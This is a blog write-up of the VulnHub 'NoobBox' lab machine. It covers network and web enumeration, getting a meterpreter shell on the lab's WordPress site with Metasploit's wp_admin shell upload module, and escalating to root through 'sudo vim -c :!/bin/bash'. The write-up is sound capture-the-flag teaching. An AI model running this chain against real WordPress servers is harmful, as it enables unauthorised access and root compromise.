<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>N00BBox :: Impulsive Strikers | Cyber Security Learning</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="This is a write up on NoobBox from vulnhub." />
<meta name="keywords" content=", " />
<meta name="robots" content="noodp" />
<link rel="canonical" href="/posts/vulnhub/noobbox/" />




<link rel="stylesheet" href="/assets/style.css">

  <link rel="stylesheet" href="/assets/green.css">






<link rel="apple-touch-icon" href="/img/apple-touch-icon-192x192.png">

  <link rel="shortcut icon" href="/img/favicon/green.png">



<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="" />
  
    <meta name="twitter:creator" content="" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="N00BBox">
<meta property="og:description" content="This is a write up on NoobBox from vulnhub." />
<meta property="og:url" content="/posts/vulnhub/noobbox/" />
<meta property="og:site_name" content="Impulsive Strikers | Cyber Security Learning" />

  <meta property="og:image" content="/">

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2021-10-05 21:38:19 &#43;0530 IST" />












</head>
<body class="green">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    Impulsive Strikers | Cyber Security, CTFs, Programming
  </div>
</a>

    </div>
    
      <div class="menu-trigger">menu</div>
    
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/showcase">Showcase</a></li>
        
      
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="/showcase">Showcase</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="/posts/vulnhub/noobbox/">N00BBox</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2021-10-05 
      </span>
    
    
    <span class="post-author">:: Karthikeyan A</span>
    
  </div>

  
  <span class="post-tags">
    
    #<a href="/tags/vulnhub/">vulnhub</a>&nbsp;
    
    #<a href="/tags/writeup/">writeup</a>&nbsp;
    
  </span>
  

  

  

  <div class="post-content"><div>
        <h1 id="noobbox">NoobBox<a href="#noobbox" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p><a href="https://www.vulnhub.com/entry/noobbox-1,664/">Vulnhub Link</a></p>
<h2 id="discover">Discover<a href="#discover" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>User netdiscover to scan the local network for machine</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth0
</code></pre></div><p>![/static/img/vulnhub/noobbox/Pasted image 20211004231834.png]</p>
<ul>
<li>netdiscover is used to inspect your network&rsquo;s ARP traffic, or find network addresses using auto scan mode, which will scan for common local networks.</li>
<li><code>-i</code> flag is used to specify the network interface, in this case eth0.</li>
<li>Found IP of NoobBox: <code>192.168.1.9</code></li>
</ul>
<h2 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h3 id="nmap">Nmap<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<ul>
<li>Scan using nmap to discover open ports and services on the machine</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sC -sV -v -oN common-ports.nmap 192.168.1.9
</code></pre></div><ul>
<li><code>-sC</code> flag is used to run default nmap scripts</li>
<li><code>-sV</code> flag is used to enumerate service versions</li>
<li><code>-v</code> flag is used for verbose output</li>
<li><code>-oN</code> flag is used to output the result in nmap format to a file, in this file is named common-ports.nmap.</li>
</ul>
<p>Result</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Nmap 7.92 scan initiated Mon Oct  4 22:07:03 2021 as: nmap -sC -sV -v -oN common-ports.nmap 192.168.1.9</span>
Nmap scan report <span style="color:#66d9ef">for</span> 192.168.1.9
Host is up <span style="color:#f92672">(</span>0.035s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">999</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
|_http-title: Apache2 Debian Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.38 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
</code></pre></div><h3 id="enumerate-the-website">Enumerate the Website<a href="#enumerate-the-website" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<ul>
<li>
<p>Open the site on the browser, we get the default Apache webserver page
![[Pasted image 20211004233047.png]]</p>
</li>
<li>
<p>We can run gobuster to enumerate the website further for directories.</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://192.168.1.9 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o initial.gobuster
</code></pre></div><p>![[Pasted image 20211004233655.png]]</p>
<ul>
<li>
<p>We can see that <em><strong>/wordpress</strong></em> is accessible.</p>
</li>
<li>
<p>On navigating to the wordpress page, we see that the site is borked due to incorrect url mapping as shown below.
![[Pasted image 20211004234031.png]]</p>
</li>
<li>
<p>On the page source we can see the borked urls as highlighted. The mentioned IP is not reachable from our end as it doesn&rsquo;t exist.
![[Pasted image 20211004234140.png]]</p>
</li>
<li>
<p>We see that in the wordpress page, there is a post, on navigating to the post, we are redirected to the unreachable url.</p>
</li>
<li>
<p>We can edit the url to point to our machine ip to access page.</p>
</li>
<li>
<p>In the page, we can see the post is created by &ldquo;noobbox&rdquo; user. This could be a username that we can try to access.
![[Pasted image 20211004234845.png]]</p>
</li>
<li>
<p>Possible user found: <code>noobbox</code></p>
</li>
</ul>
<h3 id="further-enumeration">Further Enumeration<a href="#further-enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<ul>
<li>We can use gobuster again on the wordpress page to further enumerate the wordpress site with file extensions</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://192.168.1.9/wordpress -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o wordpress.gobuster -x php,html,png,jpg,jpeg
</code></pre></div><ul>
<li>
<p>We do not find anything useful here, we continue with enumeration.
![[Pasted image 20211004235238.png]]</p>
</li>
<li>
<p>Next, we emumerate the base apache site for files using gobuster with file extensions</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://192.168.1.9 -w /usr/share/wordlists/dirb/common.txt -x php,html,png,jpg,jpeg -o files.gobuster
</code></pre></div><p>![[Pasted image 20211004235637.png]]</p>
<ul>
<li>
<p>We get a lot of default apache files along with few files in the base directory with forbidden status (status code 403).</p>
</li>
<li>
<p>The files that are accessible are img.jpg and index.html (status code 200).</p>
</li>
<li>
<p>On accessing the img.jpg url, we get an image with characters, possibly a password?&hellip;
![[Pasted image 20211005000038.png]] 
Image is blurred intentionally for the writeup purpose.</p>
</li>
<li>
<p>Possible credentials - <code>noobbox:[Redacted]</code></p>
</li>
</ul>
<h2 id="gaining-access">Gaining Access<a href="#gaining-access" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<ul>
<li>
<p>We cannot ssh into the box with the found credentials since ssh port is closed.</p>
</li>
<li>
<p>Since this is a wordpress site and we have the credentials we can try using metaspoilt to get a revershell.</p>
</li>
<li>
<p>Fire up metaspolit with <code>msfconsole</code></p>
</li>
<li>
<p>Search for wordpress shell upload</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">search wp_admin
</code></pre></div><p>![[Pasted image 20211005001506.png]]</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">use <span style="color:#ae81ff">0</span> <span style="color:#75715e">#To use the module</span>
show options <span style="color:#75715e">#To show the options that need to set (Required options)</span>
</code></pre></div><p>![[Pasted image 20211005001819.png]]</p>
<ul>
<li>We need to set the RHOSTS, TARGETURI, Username &amp; Password</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">set RHOSTS 192.168.1.9
set TARGET /wordpress/
set USERNAME noobbox
set PASSWORD <span style="color:#f92672">[</span>Redacted<span style="color:#f92672">]</span> <span style="color:#75715e">#Password redacted for writeup purpose.</span>
run <span style="color:#75715e">#To run the exploit</span>
</code></pre></div><ul>
<li>Once get the meterpreter shell, we can switch to a tty shell if preferred and get the user flag.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
ls -la
cat user.txt <span style="color:#75715e"># Read permission for all users</span>
</code></pre></div><p>![[Pasted image 20211005211559.png]]</p>
<h2 id="priviledge-escalation">Priviledge Escalation<a href="#priviledge-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<ul>
<li>We can use sudo command to check if we can run any binaries</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo -l
</code></pre></div><ul>
<li>We see that we can run vim application as a root user.</li>
<li>We can check GTFObins for vim privesc routes</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo vim -c <span style="color:#e6db74">&#39;:!/bin/bash&#39;</span> <span style="color:#75715e">#Get the root shell after providing noobbox&#39;s pwd.</span>
whoami <span style="color:#75715e">#root</span>
cat /root.txt <span style="color:#75715e"># get the root flag</span>
</code></pre></div><p>![[Pasted image 20211005212725.png]]</p>

      </div></div>

  
  
<div class="pagination">
    <div class="pagination__title">
        <span class="pagination__title-h">Read other posts</span>
        <hr />
    </div>
    <div class="pagination__buttons">
        
        
        <span class="button next">
            <a href="/posts/thm/vulnuniversity/">
                <span class="button__text">Vulnuniversity</span>
                <span class="button__icon">→</span>
            </a>
        </span>
        
    </div>
</div>

  

  

</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2021 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>







  
</div>

</body>
</html>
